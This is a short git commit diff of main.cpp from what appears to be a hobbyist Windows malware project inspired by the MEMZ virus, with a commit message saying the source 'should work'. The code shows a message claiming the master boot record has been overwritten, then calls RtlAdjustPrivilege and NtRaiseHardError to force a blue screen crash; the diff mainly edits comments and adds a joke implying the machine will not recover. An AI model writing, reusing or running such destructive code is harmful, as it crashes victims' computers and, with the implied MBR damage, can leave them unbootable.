b44ce475520f44ecdcd9ef9fec4b73c194a46c50
anas fakhfakh <Anas.batal1@gmail.com>
2019-04-18 12:41:06 +0200

    Source code, should work :)

--- main.cpp
+++ main.cpp
@@ -15,7 +15,7 @@ int main()
 	//Do some payloads...
 	//Show a message box.
 	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFY", MB_OK | MB_ICONERROR);
-	//If the user clicks OK, raise BSOD.
+	//If the user clicks OK, cause BSOD.
 	//Thanks to Leurak for his awesome virus, MEMZ!
 	HMODULE ntdll = LoadLibraryA("ntdll"); //Load NTDLL library.
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege"); //Some variables & stuff...
@@ -24,7 +24,8 @@ int main()
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
 		BOOLEAN tmp1; DWORD tmp2;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now raise BSOD.
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now cause BSOD.
 	}
+	//The computer should work fine after BSOD xD
 	return 0;
 }
